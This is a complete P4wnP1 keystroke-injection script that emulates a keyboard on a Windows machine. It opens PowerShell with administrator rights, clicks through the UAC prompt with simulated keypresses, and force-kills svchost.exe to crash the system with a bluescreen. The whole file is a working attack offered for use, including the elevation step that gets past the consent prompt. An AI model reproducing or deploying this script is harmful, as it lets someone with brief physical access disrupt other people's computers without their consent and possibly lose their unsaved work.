/*#######################################################################\
# bluescreen.js														                               #
#   Kills svchost.exe on a Windows system and bluescreens the user.      #
#   Author: chriskalv                                                    #
#                                                                        #
# PREREQUISTES:                                                          #
#   - Enable keyboard capability on your P4wnP1.                         #    
#   - Edit the settings below.                                           #
\#######################################################################*/

/////////// SETTINGS //////////\
layout('de');                 // Keyboard layout
typingSpeed(0,0)             // Typing = really fast
//////////////////////////////

// FUNCTION
press("GUI r")                          // Run
delay(1000);
type("powershell");                     // Open Powershell as Admin
press("control shift enter");
delay(2000);
press("left enter");                    // Select 'yes' in admin command prompt
delay(3000);
type("taskkill /f /im svchost.exe\n");  // Kill svchost.exe
